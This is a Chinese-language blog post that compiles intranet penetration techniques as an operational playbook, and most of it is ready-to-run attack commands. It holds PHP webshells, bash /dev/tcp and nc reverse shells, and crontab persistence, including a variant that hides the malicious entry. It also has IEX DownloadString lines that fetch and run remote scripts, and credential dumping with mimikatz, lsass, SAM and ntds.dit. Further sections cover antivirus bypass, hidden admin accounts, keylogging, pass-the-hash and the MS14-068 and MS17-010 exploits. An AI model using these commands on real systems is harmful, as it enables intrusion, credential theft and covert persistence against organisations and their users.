---
layout: post
title:  史上最强内网渗透知识点总结
tags: 基础知识 渗透 内网渗透
categories: 基础知识
published: true
---



### 获取 webshell 进内网

测试主站，搜 wooyun 历史洞未发现历史洞，github, svn, 目录扫描未发现敏感信息, 无域传送，端口只开了80端口，找到后台地址，想爆破后台，验证码后台验证，一次性，用 ocr 识别，找账号，通过 google，baidu，bing 等搜索，相关邮箱，域名等加常用密码组成字典，发现用户手册，找账号，发现未打码信息，和默认密码，试下登陆成功，找后台，上传有 dog，用含有一句话的 txt 文件

>   ```
>   <?php eval($_POST['cmd']);?>
>   ```

打包为 zip，php 文件

>   ```
>   <?php include 'phar://1.zip/1.txt';?>
>   ```

即可，c 刀被拦，修改 config.ini 文件

>   ```
>   php_make @eval(call_user_func_array(base64_decode,array($_POST[action])));
>   ```

用回调函数，第一个为函数名，二个为传的参数

### 前期信息收集

>   query user || qwinsta 查看当前在线用户
>
>   net user  查看本机用户
>
>   net user /domain 查看域用户
>
>   net view & net group "domain computers" /domain 查看当前域计算机列表 第二个查的更多
>
>   net view /domain 查看有几个域
>
>   net view \\\\dc  查看 dc 域内共享文件
>
>   net group /domain 查看域里面的组
>
>   net group "domain admins" /domain 查看域管
>
>   net localgroup administrators /domain  /这个也是查域管，是升级为域控时，本地账户也成为域管
>
>   net group "domain controllers" /domain 域控
>
>   net time /domain
>
>   net config workstation  当前登录域 - 计算机名 - 用户名
>
>   net use \\\\域控(如pc.xx.com) password /user:xxx.com\username 相当于这个帐号登录域内主机，可访问资源
>
>   ipconfig
>
>   systeminfo
>
>   tasklist /svc
>
>   tasklist /S ip /U domain\username /P /V 查看远程计算机 tasklist
>
>   net localgroup administrators && whoami 查看当前是不是属于管理组
>
>   netstat -ano
>
>   nltest /dclist:xx  查看域控
>
>   whoami /all 查看 Mandatory Label uac 级别和 sid 号
>
>   net sessoin 查看远程连接 session (需要管理权限)
>
>   net share   共享目录
>
>   cmdkey /l  查看保存登陆凭证
>
>   echo %logonserver%  查看登陆域
>
>   spn –l administrator spn 记录
>
>   set  环境变量
>
>   dsquery server - 查找目录中的 AD DC/LDS 实例
>
>   dsquery user - 查找目录中的用户
>
>   dsquery computer 查询所有计算机名称 windows 2003
>
>   dir /s *.exe 查找指定目录下及子目录下没隐藏文件
>
>   arp -a

发现远程登录密码等密码 netpass.exe  下载地址：

>   https://www.nirsoft.net/utils/network_password_recovery.html获取 window vpn 密码：

>   mimikatz.exe privilege::debug token::elevate lsadump::sam lsadump::secrets exit  wifi 密码：

>   netsh wlan show profile 查处 wifi 名
>
>   netsh wlan show profile WiFi-name key=clear 获取对应 wifi 的密码ie 代理

>   reg query "HKEY_USERSS-1-5-21-1563011143-1171140764-1273336227-500SoftwareMicrosoftWindowsCurrentVersionInternet
>
>   Settings" /v ProxyServer
>
>   reg query "HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionInternet Settings"pac 代理

>   reg query "HKEY_USERSS-1-5-21-1563011143-1171140764-1273336227-500SoftwareMicrosoftWindowsCurrentVersionInternet
>
>   Settings" /v AutoConfigURL  //引子 t0stmailpowershell-nishang

>   https://github.com/samratashok/nishang

### 其他常用命令

>   ping    icmp 连通性
>
>   nslookup www.baidu.com vps-ip dns 连通性
>
>   dig @vps-ip www.baidu.com
>
>   curl vps:8080  http 连通性
>
>   tracert
>
>   bitsadmin /transfer n http://ip/xx.exe C:\windows\temp\x.exe一种上传文件 >= 2008
>
>   fuser -nv tcp 80 查看端口 pid
>
>   rdesktop -u username ip linux 连接 win 远程桌面 (有可能不成功)
>
>   where file win 查找文件是否存在
>
>   找路径，Linux 下使用命令 find -name *.jsp 来查找，Windows 下，使用 for /r c:\windows\temp\ %i in (file lsss.dmp) do @echo %i
>
>   netstat -apn | grep 8888  kill -9 PID  查看端口并 kill

### 远程登录内网主机

判断是内网，还是外网，内网转发到 vps

>   netstat -ano  没有开启 3389 端口,复查下
>
>   tasklist /svc,查 svchost.exe 对应的 TermService 的 pid,看 netstat 相等的 pid 即 3389 端口.

### 在主机上添加账号

>   net user admin1 admin1 /add & net localgroup administrators admin1 /add

如不允许远程连接，修改注册表

>   REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
>
>   REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 0x00000d3d /f

如果系统未配置过远程桌面服务，第一次开启时还需要添加防火墙规则，允许 3389 端口，命令如下:

>   netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow

关闭防火墙

>   netsh firewall set opmode mode=disable

3389user 无法添加:

>   http://www.91ri.org/5866.html

****隐藏 win 账户****

开启 sys 权限 cmd:

>   IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1');Invoke-TokenManipulation -CreateProcess 'cmd.exe' -Username 'nt authority\system'

add user 并隐藏:

>   IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/3gstudent/Windows-User-Clone/master/Windows-User-Clone.ps1')

win server 有密码强度要求，改为更复杂密码即可:

渗透技巧——Windows 系统的帐户隐藏

>   https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/

windows 的 RDP 连接记录:

>   http://rcoil.me/2018/05/%E5%85%B3%E4%BA%8Ewindows%E7%9A%84RDP%E8%BF%9E%E6%8E%A5%E8%AE%B0%E5%BD%95/

### linux bash

>   bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

``bash -i`` 交互的 shell

``&`` 标准错误输出到标准输出

``/dev/tcp/10.0.0.1/8080`` 建立 socket ip port

``0>&1`` 标准输入到标准输出

>   (crontab -l;echo '*/60 * * * * exec 9<> /dev/tcp/IP/port;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i')|crontab -

猥琐版

>   (crontab -l;printf "*/60 * * * * exec 9<> /dev/tcp/IP/PORT;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for whoami%100c\n")|crontab -

详细介绍

>   https://github.com/tom0li/security_circle/blob/master/15288418585142.md

### ngrok-backdoor

Grok-backdoor 是一个简单的基于 python 的后门，它使用 Ngrok 隧道进行通信。Ngrok 后门可以使用 Pyinstaller 生成 windows，linux 和 mac 二进制文件。

虽然免杀，但如果开 win 防火墙会提示，生成后门时会询问是否捆绑 ngrok，选择 no 时，在被攻击机执行时需联网下载 ngrok，运行后，telnet 连接即可.

>   https://github.com/deepzec/Grok-backdoor

### veil

这里，安装问题有点多，我用 kali-2018-32 安装成功，先安装下列依赖，后按照官方即可。

>   apt-get install libncurses5*
>
>   apt-get install libavutil55*
>
>   apt-get install gcc-mingw-w64*
>
>   apt-get install wine32

生成shell

>   ./Veil.py
>
>   use 1
>
>   use c/meterpreter/rev_tcp

在 win 用 mingw 下 gcc 编译 bypass 360

>   gcc -o v.exe v.c -lws2_32

使用之前生成的 veil.rc

>   msfconsole -r veil.rc

一句话开启 http 服务，虚拟机里开启，在外访问虚拟机 ip 即可下载虚拟机文件：

>   ```
>   python -m SimpleHTTPServer 80
>   ```

### ew

tools:

>   http://rootkiter.com/EarthWorm

新版 tools：

>   http://rootkiter.com/Termite/

****正向：****

**被攻击机(跳板)：**

temp 目录下:

>   unzip ew.zip
>
>   file /sbin/init (查看 linux 位数)
>
>   chmod 755 ew_for_Linux
>
>   ./ew_for_Linux -s ssocksd -l 9999 (侦听 0.0.0.0:9999)
>
>   netstat -pantu|grep 9999 (查看是否侦听成功)

**攻击机：**

>   proxychain 设置 socks5 为跳板 ip port
>
>   proxychain nmap 即可以用跳板代理扫描其他主机

****反向：****

**攻击机：**

>   chmod 777 ./ew_for_linux64
>
>   ./ew_for_linux -s rcsocks -l 1080 -e 2333 即被攻击机连接本机 2333 端口，转发到本机的 1080 端口，访问本机的 1080 端口，相当访问被攻击机的 2333

设置

>   proxychain socks5 本主机 ip port：1080
>
>   proxychain 代理即可

**被攻击机：**

>   chmod 777 ew_for_linux
>
>   ./ew_for_Linux32 -s rssocks -d 192.168.1.100 -e 2333

### nc

nc 简单使用

>   https://tom0li.github.io/2017/05/06/nc/

linux root 权限

>   mknod /tmp/backpipe p  
>
>   /bin/sh 0</tmp/backpipe | nc ip port 1>/tmp/backpipe

权限不够用

>   ```
>   mkfifo /tmp/backpipe
>   ```

以上用 nc 监听即可

### lcx

被攻击机

>   lcx.exe -slave 139.1.2.3 8888 10.48.128.25 3389

vps    

>   lcx.exe –listen 8888 5555

在本机 mstsc 登陆 139.1.2.3:5555 或在 vps 连接 127.0.0.1:5555

### netsh win自带(只支持 tcp )360 拦

将本地80转到192.168.1.101:8080端口

>   netsh interface portproxy add v4tov4 listenport=80 connectaddress=192.168.1.101 connectport=8080

通过连接1.1.1.101的8082端口，相当连接1.1.1.101可访问的内网192.168.2.102的3389端口

>   netsh interface portproxy add v4tov4 listenaddress=1.1.1.101 listenport=8082 connectaddress=192.168.2.102 connectport=3389

### go+msf & py+msf bypass360

msf 编码生成后，用:

>   go build -ldflags="-H windowsgui -s -w"

即可，详细参考以下 link

>   http://lu4n.com/metasploit-payload-bypass-av-note/
>
>   http://hacktech.cn/2017/04/20/msf-AntiVirus.html

### 提权

win 提权辅助工具，原理主要通过 systeminfo 补丁信息比对漏洞库, 工具链接

>   https://github.com/GDSSecurity/Windows-Exploit-Suggester/

linux 提权辅助

>   https://github.com/jondonas/linux-exploit-suggester-2

感谢前辈收集的提权 exp:

windows-kernel-exploits Windows 平台提权漏洞集合

>   https://github.com/SecWiki/windows-kernel-exploits

linux-kernel-exploits Linux 平台提权漏洞集合

>   https://github.com/SecWiki/linux-kernel-exploits

### msf

linux 相关 payload：

>   linux/x86/meterpreter/reverse_tcp
>
>   linux/x86/meterpreter/bind_tcp
>
>   linux/x86/shell_bind_tcp
>
>   linux/x86/shell_reverse_tcp
>
>   linux/x64/shell/bind_tcp
>
>   linux/x64/shell/reverse_tcp
>
>   linux/x64/shell_bind_tcp
>
>   linux/x64/shell_bind_tcp_random_port
>
>   linux/x64/shell_reverse_tcp

windows 相关 payload:

>   windows/meterpreter/reverse_tcp
>
>   windows/meterpreter/bind_tcp
>
>   windows/meterpreter/reverse_hop_http
>
>   windows/meterpreter/reverse_http
>
>   windows/meterpreter/reverse_http_proxy_pstore
>
>   windows/meterpreter/reverse_https
>
>   windows/meterpreter/reverse_https_proxy
>
>   windows/shell_reverse_tcp
>
>   windows/shell_bind_tcp
>
>   windows/x64/meterpreter/reverse_tcp
>
>   windows/x64/meterpreter/bind_tcp
>
>   windows/x64/shell_reverse_tcp
>
>   windows/x64/shell_bind_tcp

目标服务器为 64 位用 x64 监听，反弹 meterpreter 用含有 meterpreter 的模块，反弹普通的 shell （例如 nc），shell_reverse_tcp 模块监听, 例如 msf:

反弹 shell  

>   msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe > shell.exe

监听:

>   windows/meterpreter/reverse_tcp

反弹 shell  

>   nc -e cmd.exe ip port

监听

>   windows/shell_reverse_tcp

meterpreter 下上传

>   upload file

下载

>   download file

### Msf 进程注入(测试 win10 没成功,win2008 可以，360 会拦)

>   meterpreter > getuid
>
>   meterpreter > getpid
>
>   meterpreter > ps
>
>   meterpreter > migrate 676

### Msf hash

>   meterpreter > run hashdump    sys
>
>   meterpreter > run post/windows/gather/smart_hashdump  需要 sys 权限

getsystem 存在 uac，用 msf bypass，但特征明显

>   meterpreter > search bypassuac

>   msf powerdump load mimikatz 不太好用

### Msf 的持续后门

****Persistence:** **

``run persistence -h`` 用于创建启动项启动，会创建注册表，创建文件。（X86_Linux 不支持此脚本）

>   run persistence -U -i 10 -p 10390 -r free.ngrok.cc

会被 360 拦，-i 10 10 秒请求一次, 使用 powershell 执行也被监控而被 360 拦截

meterpreter 的 ``run getgui -e`` 命令可以开启成功。360 会提示阻止

``Run metsvc -h`` ：用于创建服务，会创建 meterpreter 服务，并上传三个文件，使用-r参数可以卸载服务 ，被拦

### Msf powershell

>   meterpreter > load powershell
>
>   meterpreter > powershell_shell
>
>   PS > IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');
>
>   Ps > Invoke-Mimikatz -DumpCreds

### Msf Router

2 个或多个路由之间，没有配置相应的路由表，不能访问，获得一台机器 shell session  添加路由，使 msf 可以在当前 shell session 下以被攻击机访问其他内网主机，

>   meterpreter > run get_local_subnets
>
>   meterpreter > run autoroute -s 172.17.0.0/16  添加路由
>
>   meterpreter > run autoroute -p  查看路由
>
>   meterpreter > run autoroute -d -s 172.17.0.0/16  删除

MS17-010

>   meterpreter > background
>
>   msf exploit(multi/handler) > use auxiliary/scanner/smb/ smb_ms17_010
>
>   msf auxiliary(scanner/smb/smb_ms17_010) > set rhosts 172.17.0.0/24
>
>   msf auxiliary(scanner/smb/smb_ms17_010) > set threads 50
>
>   msf auxiliary(scanner/smb/smb_ms17_010) > run

先利用 ``exploit/windows/smb/ms17_010_psexec``，win10 旧版依旧可以，新版设置  smbuser，smbpass 即可

### Msf 扫描

经过上面设置路由即可使用以下 scan：

>   use auxiliary/scanner/portscan/syn
>
>   use auxiliary/scanner/portscan/tcp

proxychains 设置 socks4 为以下设置，即可在本地代理扫描

>   use auxiliary/server/socks4a

### Msf 端口转发 portfwd

将 192.168.1.2.100 内网转发到本地 4443 port，流量大不好用

>   portfwd add -L 0.0.0.0 4443 -p 3389 -r 192.168.2.100

### Msf 截屏(没被 360 拦没提示，或许有意外收获)

>   meterpreter > use espia
>
>   meterpreter > screengrab

### Msf 嗅探

>   meterpreter > use sniffer
>
>   meterpreter > sniffer_interfaces
>
>   meterpreter > sniffer_start 5
>
>   meterpreter > sniffer_dump 5 /tmp/1.pcap
>
>   meterpreter > sniffer_stop 5

### 键盘记录

Msf 键盘记录在 win 不会创建新进程

>   meterpreter > keyscan_start
>
>   meterpreter > keyscan_dump
>
>   meterpreter > keyscan_stop

Keylogger (tip: 可以把管理工具，如 navicat, putty, SecureCRT, PLSQL 设置记住密码) --redrain ixkeylog

linux>=2.63 推荐 --redrain

### 远程命令执行

>   at\schtasks\psexec\wmic\sc\ps

2012 r2 起,默认端口 5985,系统自带远程管理 winrs

>   winrs -r:192.168.1.100 -u:administrator -p:pwd ipconfig

这里 schtasks 用着很舒服，

>   schtasks /create /tn mytask /tr F:\Desktop.exe /sc minute /mo 1  每分运行1次

如果程序有参数用引号

>   "C:\procdump64.exe -accepteula -ma lsass.exe lsass.dmp"

``/RU`` 可以以 system 启动，例如

>   schtasks /Create /TN test /SC DAILY /ST 00:09 /TR notepad.exe /RU SYSTEM

>   schtasks /create /tn mytask /tr "C:\procdump64.exe -accepteula -ma lsass.exe lsass.dmp" /sc minute /mo 2

>   schtasks /Query /TN mytask

>   net time

>   schtasks /Query /TN mytask

>   schtasks /Delete /TN mytask /F

### mimikatz + procdump 获得内存 hash

如果服务器是 64 位，要把 Mimikatz 进程迁移到一个 64 位的程序进程中，才能查看 64 位系统密码明文。32 位任意

运行

>   procdump.exe -accepteula -ma lsass.exe lsass.dmp(管理权限)

后 lsass.dmp 放到 mimikatz.exe 同目录，运行以下命令

>   mimikatz.exe "sekurlsa::minidump lsass.dmp" "log" "sekurlsa::logonpasswords"

导出当前

>   mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"

>   powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"

Windows Server 2012, 部分 Windows Server 2008 默认无法使用 mimikatz 导出明文口令

解决方法：启用 Wdigest Auth, cmd:

>   reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

powershell:

>   Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1

重启或者用户再次登录，能够导出明文口令, 参考下文：

3gstudent 自动Dump-Clear-Text-Password-after-KB2871997-installed

>   https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed

### SAM-hash

管理权限：

>   reg save HKLM\SYSTEM Sys.hiv
>
>   reg save HKLM\SAM Sam.hiv

mimikatz:

>   lsadump::sam /sam:Sam.hiv /system:Sys.hiv

### pass the hash

wmiexec 普通权限即可

>   https://github.com/maaaaz/impacket-examples-window

>   domain=TEST user=test1
>
>   wmiexec -hashes 00000000000000000000000000000000:99b2b135c9e829367d9f07201b1007c3 TEST/test1@192.168.1.1 "whoami"

需要管理权限

>   mimikatz "privilege::debug" "sekurlsa::pth /user:abc /domain:test.local /ntlm:hash"

>   meterpreter > run post/windows/gather/hashdump
>
>   meterpreter > background

>   msf > use exploit/windows/smb/psexec
>
>   msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
>
>   msf exploit(psexec) > set SMBuser Administrator
>
>   msf exploit(psexec) > set SMBPass xxxxxxxxxxxx9a224a3b108f3fa6cb6d:xxxxf7eaee8fb117ad06bdd830b7586c
>
>   msf exploit(psexec) > exploit
>
>   meterpreter > shell

安装了 KB2871997 补丁或者系统版本大于等于 windows server 2012 时，内存不再明文保存密码，1,改注册表后，注销再次登录，可以使用，schtasks 等执行命令无法用管理员权限。2.用 ptk，ptt。例外，打补丁后 administrato（SID-500） 依旧可以pth

>   https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0/

### pass the key

需要免杀：

>   mimikatz "privilege::debug" "sekurlsa::ekeys"  获取用户的aes key
>
>   mimikatz "privilege::debug" "sekurlsa::pth /user:a /domain:test.local /aes256:asdq379b5b422819db694aaf78f49177ed21c98ddad6b0e246a7e17df6d19d5c"  注入aes key
>
>   dir \\\计算机名

### pass the ticket

不需要管理员权限

>   kekeo "tgt::ask /user:abc /domain:test.local /ntlm:hash"

导入ticket：

>   kekeo "kerberos::ptt TGT_abc@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi"

程序地址：

>   https://github.com/gentilkiwi/kekeo

### ntds.dit

vssadmin 方法 >= win 2008

查询当前系统的快照

>   vssadmin list shadows

创建快照

>   vssadmin create shadow /for=c:
>
>   获得 Shadow Copy Volume Name 为 ``\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy47``

复制 ntds.dit, copy 第一个参数为创建快照时位置:

>   copy \\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy47\windows\NTDS\ntds.dit c:\ntds.dit   

复制 system 和 sam

>   copy \\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy47\windows\system32\config\system c:\
>
>   copy \\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy47\windows\system32\config\sam c:\

删除快照

>   vssadmin delete shadows /for=c: /quiet

获取将以上 system，sam, ntds.dit 放到 /root/ntds_cracking/ 下，运行

>   python secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/SYSTEM LOCAL

py 地址:

>   https://github.com/CoreSecurity/impacket/blob/master/examples/secretsdump.py

域渗透——获得域控服务器的 NTDS.dit 文件

>   http://www.4hou.com/technology/10573.html

### dc 定位

>   nltest dclist:xx.xx
>
>   net time /domain
>
>   systeminfo 中的 domain
>
>   ipconfig /all 中的 DNS Suffix Search List
>
>   扫描53端口，找 dns 位置
>
>   set log
>
>   net group "domain controllers" /domain
>
>   PowerView Get-NetDomainController

PowerView 地址:

>   https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon

### windows log

微软第三方信息收集工具 LogParser.exe psloglist.exe 等

### powerhsell 神器

nishang

>   https://github.com/samratashok/nishang

spn扫描

>   https://github.com/nullbind/Powershellery/tree/master/Stable-ish

PowerSploit

>   https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon

针对ps的Empire

>   https://github.com/EmpireProject/Empire

### ipc$

>   D:>net use \\\192.168.1.254\c$ "pwd" /user:user   //连接192.168.1.254的IPC$共享，用unc路径
>
>   D:>copy srv.exe \\\192.168.1.254\c$ //复制本地 srv.exe 到C根目录
>
>   D:>net time \\\192.168.1.254     //查时间
>
>   D:>at　\\\192.168.1.254 10:50 srv.exe //用at命令在10点50分启动 srv.exe (这里360会拦截)
>
>   D:>net use \\\192.168.1.254\c$ /del

### ms14-068 Kerberos 漏洞利用：

生成 TGT：用于伪造

>   whoami /all  获得：用户@ 域名、用户 sid、域主机

>   python ms14068.py -u admin@xxx.com -p password -s sid -d dc.xxx.com
>
>   ms14068.exe -u admin@xxx.com -p password -s sid -d dc.xxx.com

会生成 TGT_admin@xxx.com.ccache

注入 TGT：

>   klist
>
>   klist purge 清除所有凭证，等一会在执行下列命令

写入内存:

>   mimikatz.exe "kerberos::ptc c:\TGT_admin@xxx.com.ccache"

若成功

>   dir \\dc.xxx.com\c$
>
>   net user admin xxxxx@password /add /domain
>
>   net group "Domain Admins" admin /add /domain

msf 的模块 ``ms14_048_kerberos_checksum`` 也可以检测

工具：

>   https://www.t00ls.net/viewthread.php?tid=28207&from=favorites
>
>   https://github.com/gentilkiwi/kekeo

### GPP 漏洞利用

win2008 增加，一般域用户都可访问敏感文件

密码存在 SYSCOL 目录下:

Groups.xml, 这个文件是域管通过 GPP 设置或修改本地密码留下的

>   Services\Services.xml,
>
>   ScheduledTasks\ScheduledTasks.xml,
>
>   Printers\Printers.xml,
>
>   Drives\Drives.xml,
>
>   DataSources\DataSources.xml

>   net use \\\域控(如pc.xx.com) password /user:xxx.com\username
>
>   dir \\\域控\SYSVOL /s /a > sysvol.txt
>
>   findstr /i "groups.xml" sysvol.txt

找到 cpassword

解密过程：

>   set-executionPolicy bypass
>
>   powershell -ep bypass   启动 ps
>
>   Import-Module .\GPP.ps1
>
>   Get-DecryptedCpassword  xxxxxxxxxxxxxx

脚本link：

>   https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1

利用 SYSVOL 还原组策略中保存的密码

>   https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/

### 总结

首先，利用 webshell 执行开篇的命令收集内网前期信息(不局限用 webshell)，也可以用 msf 等平台，或 powershell 收集信息，判断机器所处区域，是 DMZ 区，还是办公区，核心 DB 等;机器作用是文件服务器，Web，测试服务器，代理服务，还是 DNS，DB 等;网络连通性，文中也提到测试 dns，tcp，http 等命令，理清内网拓扑图，网段，扫描内网，路由，交换机，端口等判断是域还是组，组的话，用常见 web 方法，域的话 gpp，kerberos，黄金白银票据，抓密码，这里注意密码有的有空格，pth，ptk,spn 扫描，ipc,445,web 漏洞，各种未授权，密码相同等，期间会遇到提权，bypass uac，bypass av.

### 某些大佬语录

利用漏洞配置不当获取更多主机权限

常见应用漏洞：

>   struts2、zabbix、axis、ImageMagic、fastcgi、Shellshock、redis未授权访问、Hadoop、weblogic、jboss、WebSphere、Coldfusion

常见语言反序列化漏洞

>   php、Java、python、ruby、node.js

数据库漏洞及配置不当

>   mssql Get-SQLServerAccess、MySQL 低版本 hash 登陆、MySQL 低版本Authentication Bypass、域内 mssql 凭证获取密码、monggodb 未授权访问、memcache 配置不当

内网中很多 web 应用存在常见漏洞、使用有漏洞的中间件和框架、弱口令及配置不当（注入、任意文件读取、备份、源码泄漏（rsync、git、svn、DS_Store）、代码执行、xss、弱口令、上传漏洞、权限绕过…）

web应用、及数据库中寻找其他服务器密码信息（ftp、mail、smb、ldap存储、sql...）

系统备份文件（ghost）中读密码

在已有控制权限主机中，查看各浏览器书签、cookie、存储密码、键盘记录收集相关敏感信息、查询注册表中保存密码、读取各客户端连接密码、putty dll 注入、putty 密码截取、ssh 连接密码，以获取更多主机权限

推荐工具：

>   NetRipper、Puttyrider.exe、ProwserPasswordDump.exe、LaZagne.exe

ms08-067 远程溢出（极少能碰到）

cmdkey /list 远程终端可信任连接连接 netpass.exe 读取该密码

arp 欺骗中间人攻击（替换 sql 数据包、认证凭证获取、密码获取极大不到万不得已不会用）

WPAD 中间人攻击（全称网络代理自动发现协议、截获凭证该种方法不需要 ARP 欺骗，比较好用的一种方法（使用 Responder.py/net-creds.py））翻阅相关文件及以控制数据库中可能存储配置口令（别忘了回收站）

用已有控制权限的邮箱账号以及前期所了解到的信息进行欺骗（社会工程学）

定向浏览器信息 ip 信息定向挂马（0day）

用以收集的密码（组合变换密码）对各服务进行爆破

其他用户 session，3389 和 ipc 连接记录 各用户回收站信息收集

host 文件获取和 dns 缓存信息收集 等等

杀软 补丁 进程 网络代理信息 wpad 信息。软件列表信息

计划任务 账号密码策略与锁定策略 共享文件夹 web 服务器配置文件

vpn 历史密码等 teamview 密码等 启动项 iislog 等等

主动手段 就是 snmp 扫交换机路由网络设备(有 tcp 连接存活表列 一般可以定位到经常访问的服务 ip)

遍历 内网的所有段 + tracert 跟踪路由 一下拓扑基本就清楚了

被动手段就是上内部通讯平台 一般是邮箱

如果是有堡垒隔离和 vlan 隔离的还要拿到相应权限网络设备做管道穿越才行 通讯都做不了就不要谈后续渗透了

横向渗透 smb 感染 pdf doc + RDP 感染管理机 动静小一点就插管道连接钓 NTHASH

域控只能看看 普通用户机上有没有令牌可以伪造 ms14-068 是否存在

搜集的信息列出来，就不贴了：

服务器当前所在网段的所有主机端口

服务器 ARP 缓存

服务器上的服务

内网中其他 HTTP 服务

满足容易利用的漏洞端口 （MS17010 / 445）

抓包嗅探还是很有必要的 （千万不要 ARP %@#@@651#@^#@@#@@###@@!）

共享文件

密码

在行动之前思考几分钟，有没有更好的办法

思考一个问题多个解决方案的利弊

尽量快速熟悉网络环境 -> [前提是你已经熟悉了服务器环境]

对日志要时刻保持敏感

看子网掩码、计算子网大小，判断有没有 VLAN

选取自己熟悉的协议进行信息搜集

网络命令一定要熟

对于后门要加强维护

你必须保证你花费 98% 的时间都在了解他们

学习使用 Powershell 和熟练掌握端口转发

渗透测试的本质是信息收集

### 扩展阅读

利用 NetBIOS 协议名称解析及 WPAD 进行内网渗透

>   http://drops.xmd5.com/static/drops/pentesting-11799.html

记一次内网渗透

>   http://killbit.me/2017/09/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/

端口复用参考代码

>   https://xz.aliyun.com/t/1661

l3m0n:从零开始内网渗透学习

>   https://github.com/l3m0n/pentest_study

内网渗透知识大总结

>   https://www.anquanke.com/post/id/92646

Jboss引起的内网渗透

>   https://xz.aliyun.com/t/8#toc-2

JBoss引起的内网渗透-2

>   https://xz.aliyun.com/t/2166

JBoss引起的内网渗透-3

>   http://rcoil.me/2018/03/JBoss%E5%BC%95%E8%B5%B7%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-3/

Linux内网渗透

>   https://thief.one/2017/08/09/2/

Weblogic引发的血案

>   http://hone.cool/2018/03/29/Weblogic%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88/

Weblogic引发的血案-2

>   http://hone.cool/2018/04/03/Weblogic%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88-2/

Weblogic引发的血案-3

>   http://hone.cool/2018/04/12/Weblogic%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88-3/

一次幸运的内网渗透

>   https://forum.90sec.org/forum.php?mod=viewthread&tid=10111&highlight=%C4%DA%CD%F8

对国外某内网渗透的一次小结

>   https://forum.90sec.org/forum.php?mod=viewthread&tid=9264&highlight=%C4%DA%CD%F8

针对国内一大厂的后渗透 – 持续

>   https://wsygoogol.github.io/2018/01/11/%E9%92%88%E5%AF%B9%E5%9B%BD%E5%86%85%E4%B8%80%E5%A4%A7%E5%8E%82%E7%9A%84%E5%90%8E%E6%B8%97%E9%80%8F-%E2%80%93-%E6%8C%81%E7%BB%AD/

一次内网渗透--域渗透

>   https://forum.90sec.org/forum.php?mod=viewthread&tid=6516&highlight=%C4%DA%CD%F8

代理转发工具汇总分析

>   [https://mp.weixin.qq.com/s/gztsWf8JaugMY0zfuqQxCQ](https://mp.weixin.qq.com/s?__biz=MjM5Mzk1MzE0MA==&mid=2651721159&idx=1&sn=fd23b314e44f22f77c6a58a64c924c9c&scene=21#wechat_redirect)

渗透测试技巧之内网穿透方式与思路总结

>   https://xz.aliyun.com/t/1623

ew

>   [https://mp.weixin.qq.com/s/VBiwJmpfIcRpdhwwWt2Ciw](https://mp.weixin.qq.com/s?__biz=MjM5NDM1OTM0Mg==&mid=2651050825&idx=1&sn=a20bee6081fddb51441d9389e0762ab5&scene=21#wechat_redirect)

通过双重跳板漫游隔离内网

>   https://paper.tuisec.win/detail/60e44a10243185a

一款突破内网防火墙神器ngrok

>   https://paper.tuisec.win/detail/75e46a067d7b6f8

内网漫游之SOCKS代理大结局

>   https://paper.tuisec.win/detail/fc04d85ab57c8bf

内网剑客三结义

>   http://www.5ecurity.cn/index.php/archives/227/

针对 win 的入侵日志简单处理

>   https://klionsec.github.io/2017/05/19/wevtutil/

Metasploit域渗透测试全程实录（终结篇）

